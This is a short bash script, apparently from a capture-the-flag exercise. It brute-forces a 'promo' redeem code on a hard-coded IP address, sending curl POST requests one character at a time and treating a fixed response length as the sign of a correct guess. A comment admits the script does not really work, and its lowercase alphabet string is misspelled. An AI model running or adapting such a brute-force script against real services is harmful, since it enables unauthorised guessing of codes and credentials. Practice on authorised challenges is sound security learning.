#!/bin/bash

# doesn't really work, the point is a brute force to determine the passcode

url='http://141.85.224.118:8010'

str_1='abcdefghijklmnopqrstvuwxys'
str_2='ABCDEFGHIJKLMNOPQRSTVUWXYZ'
str_3='0123456789'
str=$str_2$str_1$str_3'{}_'

while [ -n "$str" ]; do
    next=${str#?}
    char="${str%$next}"
    aux=$aux$char
    echo "Check SSS$aux"
    out=$(curl -s -d 'promo=SSS'$aux'&submit=Redeem' -H "Content-Type: application/x-www-form-urlencoded" -X POST $url | wc -c)
    if [ $out -eq 11085 ]
    then
        echo "Match character - $char"
        echo
        str=$str_2$str_1$str_3'{}_'
        continue
    else
        echo "Not match character - $char"
        echo
        aux=${aux%?}
    fi
    str=$next
done

flag='SSS'$aux

echo $flag
